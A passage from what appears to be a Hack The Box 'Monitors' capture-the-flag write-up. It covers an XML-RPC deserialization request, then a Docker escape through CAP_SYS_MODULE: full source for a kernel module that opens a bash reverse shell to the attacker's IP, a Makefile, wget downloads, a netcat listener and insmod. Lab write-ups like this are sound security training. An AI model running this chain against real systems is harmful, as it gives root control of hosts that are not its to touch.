curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'> PAYLOAD </serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
```

Once inside the victim machine, we can confirm our presence on the system using the command:

```
hostname -I
```

However, instead of being directly on the victim machine, we are inside a container, with the IP address `172.17.0.2`. Something curious is that when running the _whoami_ command, we discover that we are the `root` user, indicating that we have administrator privileges within the container.

![60](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/60.png){:class="blog-image" onclick="expandImage(this)"}

Since we are `root`, the next step would be to attempt to escape this environment. As we already have administrator privileges, we can try to perform a `docker breakout` to gain access to the host machine while preserving our `root` status.

By default, `Docker` assigns certain `capabilities` to containers. Although the set of assigned _capabilities_ is minimal to hinder exploitation, there are certain _capabilities_ that, if present, can allow us to escape the container. We can list the existing _capabilities_ with the following command:

```
capsh --print
```

![61](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/61.png){:class="blog-image" onclick="expandImage(this)"}

Among the _capabilities_ found in the container, we identified `CAP_DAC_OVERRIDE` and `CAP_SYS_MODULE`, both of which we could attempt to exploit. With `CAP_DAC_OVERRIDE`, we could write to the host machine's filesystem. However, for this to be possible, the `CAP_DAC_READ_SEARCH` capability must also be present, which is not the case here, so this exploitation path is not viable. Instead, we can exploit `CAP_SYS_MODULE`.

This _capability_ allows processes to load and unload _kernel modules_, enabling us to inject code directly into the system's _kernel_. Since containers are isolated at the operating system (OS) level but share the _kernel_ with the host system, this _capability_ allows us to interact with _it_ through the container. This enables us to fully compromise the system by modifying the _kernel_ and bypassing all Linux security barriers, including security modules and the container's isolation itself.

To take advantage of the `CAP_SYS_MODULE` capability and escape the container, we will write a _kernel module_ that opens a _reverse shell_ to our attacker machine. This module will be compiled using a _Makefile_, and then injected into the host system's _kernel_ to execute the code.

We will write a `reverse-shell.c` file that contains the code for the _kernel module_:

```c
#include <linux/kmod.h>
#include <linux/module.h>

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<ourIP>/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

This code defines a _kernel module_ that uses the `call_usermodehelper` function to execute the command that will open a _reverse shell_ on the host system. When the module is initialized through `reverse_shell_init`, the command is executed, establishing a connection to our IP on port `4444`.

![62](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/62.png){:class="blog-image" onclick="expandImage(this)"}

On the other hand, we will define a Makefile that automates the process of compiling the module:

```make
obj-m +=reverse-shell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

This _Makefile_ is responsible for creating the binary file for the module (`reverse-shell.ko`) using the source code `reverse-shell.c`. The line `make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules` tells the compiler to use the active version of the _kernel_ on the host system to build the module. The `make clean` command, on the other hand, removes any files generated during the compilation process, keeping the environment clean.

![63](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/63.png){:class="blog-image" onclick="expandImage(this)"}

Once again, we will host a server on our attacking machine using _Python_:

```
python3 -m http.server 80
```

From the container, we will download the two files we just created using `wget`.

```
wget http://<ourIP>:80/reverse-shell.c
```

```
wget http://<ourIP>:80/Makefile
```

![64](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/64.png){:class="blog-image" onclick="expandImage(this)"}

Next, we will run the `make` command to compile the module, which will generate the `reverse-shell.ko` file.

```
make
```

![65](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/65.png){:class="blog-image" onclick="expandImage(this)"}

Now, we will start listening on our attacking machine using `Netcat` on the port we defined in `reverse-shell.c`:

```
nc -nlvp 4444
```

Finally, we will inject the module into the kernel using:

```
insmod reverse-shell.ko
```

By running this command, we will get a _reverse shell_ on the host machine, this time with `root` privileges, allowing us to list the final flag.

![66](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/66.png){:class="blog-image" onclick="expandImage(this)"}
